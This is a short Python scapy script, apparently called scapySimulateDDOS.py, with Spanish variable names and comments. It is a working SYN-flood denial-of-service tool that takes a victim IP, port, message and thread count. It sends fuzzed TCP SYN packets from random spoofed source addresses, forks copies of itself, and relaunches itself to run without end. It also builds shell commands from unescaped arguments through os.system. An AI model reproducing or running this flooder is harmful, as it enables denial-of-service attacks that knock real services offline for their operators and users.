#! /usr/bin/env python
import sys
import os
from scapy.all import *

victima=sys.argv[1]
puerto=sys.argv[2]
mensaje=sys.argv[3]
hilos=sys.argv[4]
print victima
print puerto
print mensaje
try:
        hilos=int(hilos)
except:
        hilos=0
print hilos

while hilos > 0:
        if os.fork() == 0:
                os.system("scapySimulateDDOS.py "+str(victima)+" "+str(puerto)+" '"+str(mensaje)+"' 0")
        hilos-=1

ddos=IP(src=RandIP(),dst=str(victima),id=1111,ttl=255)/fuzz (TCP(sport=RandShort(),dport=int(puerto),seq=12345,ack=1000,window=1000,flags="S"))/str(mensaje)
ls(ddos)
srloop(ddos,inter=0.01,count=1000)
#Y para que sea infinito lo lanzamos otra vez
if os.fork() == 0:
        os.system("scapySimulateDDOS.py "+str(victima)+" "+str(puerto)+" '"+str(mensaje)+"' 0")
exit()

